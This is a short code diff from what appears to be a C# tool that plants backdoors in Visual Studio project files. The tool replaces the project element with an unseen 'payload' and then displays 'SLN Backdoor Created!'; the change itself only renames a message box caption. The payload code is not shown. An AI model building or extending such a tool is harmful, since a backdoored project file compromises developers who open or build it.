@@ -27,7 +27,7 @@
                             projectfile = projectfile.Replace(ToolsVersion15, ToolsVersion14);
                             projectfile = projectfile.Replace(Project, payload);
                             File.WriteAllText(ofd.FileName, projectfile);
-                            MessageBox.Show($"SLN Backdoor Created!\nRemoved Old up & created a new one.!", "The Bro's", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            MessageBox.Show($"SLN Backdoor Created!\nRemoved Old up & created a new one.!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                             break;
                         case false:
                             //create backup and backdoor
@@ -36,7 +36,7 @@
                             projectfile = projectfile.Replace(ToolsVersion15, ToolsVersion14);
                             projectfile = projectfile.Replace(Project, payload);
                             File.WriteAllText(ofd.FileName, projectfile);
-                            MessageBox.Show($"SLN Backdoor Created & Backup made!", "The Bro's", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            MessageBox.Show($"SLN Backdoor Created & Backup made!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                             break;
                     }
                 }
